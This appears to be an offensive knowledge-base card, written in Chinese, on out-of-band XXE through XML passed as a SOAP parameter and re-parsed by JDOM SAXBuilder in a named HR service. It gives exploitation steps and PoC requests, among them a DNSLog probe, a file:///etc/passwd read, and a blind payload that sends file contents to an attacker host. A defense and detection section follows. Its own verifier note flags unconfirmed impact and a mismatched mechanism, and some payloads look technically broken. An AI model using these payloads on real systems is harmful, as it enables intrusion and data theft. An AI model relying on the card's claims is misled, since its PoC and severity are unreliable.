---
id: web-generic-xxe-soap-parameter-nested-xml-saxbuilder-oob
title: SOAP 参数内嵌 XML 二次解析：JDOM SAXBuilder 未禁 DTD 导致 OOB XXE
type: scenario
domain: web
path: web/generic/xxe
technique: xxe-soap-nested-xml-saxbuilder-oob
tags:
- xxe
- soap
- java
- jdom
- saxbuilder
- oob
- external-entity
cve: []
severity: high
confidence: medium
status: draft
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-17
  verified_at: '2026-11-08T09:14:38+08:00'
  notes: 源码链路核对成立：图27 显示 HrpService.impInfoByNotice(arg0) → impInfoByMidtable，图28 显示 getParamBean 用 new SAXBuilder().build(ByteArrayInputStream(arg0.getBytes())) 解析参数。但最终危害未验证：原文 34 张图中没有任何 DNSLog 命中或回显截图，XXE 仅有请求构造无结果；且 PoC 把 <!DOCTYPE> 放在 soapenv:Envelope 之前，此时外部 DTD 由 SOAP 信封解析器拉取，并非卡内主打的 arg0 二次 SAXBuilder 解析，机制归属存疑（卡内已自承需实测，但标题与结论仍按内层解析表述）。severity high 缺证据支撑。
url: /docs/web/generic/xxe/web-generic-xxe-soap-parameter-nested-xml-saxbuilder-oob/
draft: false
kb_aliases:
- SOAP 参数 XXE
- 二次解析 XML XXE
- JDOM SAXBuilder XXE
- impInfoByNotice XXE
- 内嵌 XML 实体外带
- dnslog 验证 XXE
---

## 一句话结论

当 SOAP 方法的某个参数本身就是一段 XML 字符串、服务端再用 JDOM `new SAXBuilder().build(...)` 解析它时，XXE 防护往往只做在 SOAP 信封层而遗漏这次二次解析；把 `<!DOCTYPE ... SYSTEM "http://dnslog">` 塞进参数并在元素里引用实体，即可让服务端发起外部请求（OOB），进一步可外带文件内容。

## 原理

- **两次解析，两套安全配置**：SOAP 服务端至少要解析两次 XML——框架解析 SOAP 信封，业务方法再把"XML 报文"参数 `getBytes()` 后交给自己的解析器。防护常只做在其中一层，另一层仍是默认配置。
- **JDOM `SAXBuilder` 默认允许 DTD 与外部实体**：`new SAXBuilder()` 未调用 `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` 时，`build(InputStream)` 会处理 DOCTYPE、拉取外部 DTD、展开 `SYSTEM` 实体。`<!DOCTYPE syscode SYSTEM "http://attacker/">` 会直接触发一次外部请求（可先用 DNSLog 判定），`<!ENTITY xxe SYSTEM "file:///etc/passwd">` 则读取本地文件。
- **为什么先做 OOB 而不是直接读文件**：`getParamBean` 只取 XPath `/hr/params/taskinfo` 的值，实体展开结果不一定回到响应里，属"无回显"场景；先用外部 DTD 观察 DNS/HTTP 命中确认解析器行为，再用参数实体把文件内容拼进 URL 外带。
- **入口链路**：`HrpService.impInfoByNotice(arg0)` → `HrIssuanceInterf.impInfoByMidtable(arg0, conn)` → `getParamBean(arg0)` → `byte[] var3 = var1.getBytes()` → `new ByteArrayInputStream(var3)` → `SAXBuilder.build(var4)`。参数是纯字符串，SOAP 层不做 XML 白名单。
- **哪一层解析器触发要实测**：原文把 `<!DOCTYPE>` 放在 `<soapenv:Envelope>` 之前、实体引用放在 `<arg0>` 内部，因此外部 DTD 的拉取可能发生在外层信封解析，也可能发生在把 `arg0` 字符串交给 `SAXBuilder` 的二次解析；判定方法是把 DOCTYPE 分别挪到 `<arg0>` 内外各测一次，或观察是否只有特定 service 方法可用（只有走 `getParamBean` 的方法才可能触发内层解析）。
- **同类面很多**：同一服务的 `getHolidayMsg`、`impInfoByNotice`、`getRemainHolidays`、`syncHolidayMsg`、`updateHolidays`、`Huayu_peWageRecv`，以及 `SynToADService.sendSyncMsg`、`OutputTemplateDataServlet.doPost` 都走"参数是 XML"的模式；一个解析器不安全，往往整片方法都不安全。

## 触发条件

- 存在 SOAP（或 REST）方法，其参数值是 XML 文本，服务端会用未加固的解析器二次解析。
- 解析器允许 DOCTYPE/外部实体（JDOM `SAXBuilder` 默认、`DocumentBuilderFactory` 默认、`SAXParserFactory` 默认等）。
- 至少能出网（OOB 验证），或实体内容会进入响应/日志（有回显）。
- 方法可达（通常同时存在 `/services/` 未授权白名单问题）。

## 利用步骤

1. 反编译 service 实现，找 `SAXBuilder`、`DocumentBuilder`、`SAXParser`、`XMLReader`、`DocumentHelper.parseText` 等二次解析调用，确认入参来自 SOAP 参数。
2. 先用 DNSLog 做无回显验证：在参数里放 `<!DOCTYPE x SYSTEM "http://<id>.dnslog.cn">`，元素中引用实体；观察 DNS 记录。
3. 确认解析器解析 DOCTYPE 后，改参数实体 + 外部 DTD，把目标文件内容拼到 URL 查询串中外带。
4. 若有回显（解析结果被回传），直接 `<!ENTITY xxe SYSTEM "file:///flag">` 读文件。
5. 横向测试同一服务的其它"参数是 XML"的方法。

## PoC

无回显验证（DNSLog）：

```http
POST /services/HrpService HTTP/1.1
Host: target
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://8b5gf4.dnslog.cn">
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:hr="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:impInfoByNotice>
         <arg0>
<M><syscode>&send;</syscode></M>
</arg0>
      </hr:impInfoByNotice>
   </soapenv:Body>
</soapenv:Envelope>
```

同一解析器上的另一个方法：

```xml
<hr:Huayu_peWageRecv>
  <arg0><M><syscode>&send;</syscode></M></arg0>
</hr:Huayu_peWageRecv>
```

有回显时读取文件（把 DOCTYPE 与实体声明直接放进 `<arg0>` 内部，验证是否为内层 SAXBuilder 解析）：

```xml
<arg0>
<!DOCTYPE M [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<M><syscode>&xxe;</syscode></M>
</arg0>
```

盲外带（需要攻击者可控 HTTP 服务）：

```xml
<!DOCTYPE M [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://attacker/?d=%file;'>">
]>
<M><syscode>%int;%send;</syscode></M>
```

## 变体与关联

- **变体（解析器）**：JDOM `SAXBuilder`、`DocumentBuilderFactory`、`SAXParserFactory`、`XMLReader`、dom4j `DocumentHelper.parseText`、`SAXReader.read`。
- **变体（入口）**：SOAP 参数内嵌 XML、上传的 XML/SVG/DOCX、数据库里存的 XML 配置、消息队列报文。
- **变体（外带）**：DNSLog 验证、参数实体 HTTP 外带、错误信息回显、把内容写入可下载路径。
- **关联**：[[web-generic-xxe-inband-file-read-default-insecure]]（默认不安全解析器基线）、[[web-generic-xxe-utf16be-encoding-filter-bypass]]（编码绕过）、[[web-generic-xxe-lxml-config-xml-pollution]]（配置注入触发 XXE）、[[web-java-framework-xfire-services-filter-whitelist-unauth-invoke]]（未授权入口）。
- **边界**：解析器设置 `disallow-doctype-decl=true`、禁用外部实体、`setExpandEntityReferences(false)`，或参数在进入解析器前被强制转义（`&lt;`）时，该链失效；不出网且无回显时无法确认/利用。

## 检测与防御

- **修复**：对每个 `new SAXBuilder()`/`DocumentBuilderFactory` 显式关闭 DTD 与外部实体；JDOM 用 `SAXBuilder` 时设置 `disallow-doctype-decl`、`external-general-entities=false`、`external-parameter-entities=false`，并 `setExpandEntityReferences(false)`。
- **统一封装**：把安全解析器封装成工具类，禁止业务代码直接 new 默认解析器；对"参数是 XML"的接口做 Schema 校验与长度限制。
- **收敛**：SOAP 接口要求鉴权，关闭 WSDL，限制出网与文件读取权限。
- **检测**：请求体出现 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`，尤其是出现在 `<argN>` 内部；服务端异常外连 DNS/HTTP；解析报错含实体名；同一接口短时间多次不同 DOCTYPE 目标。
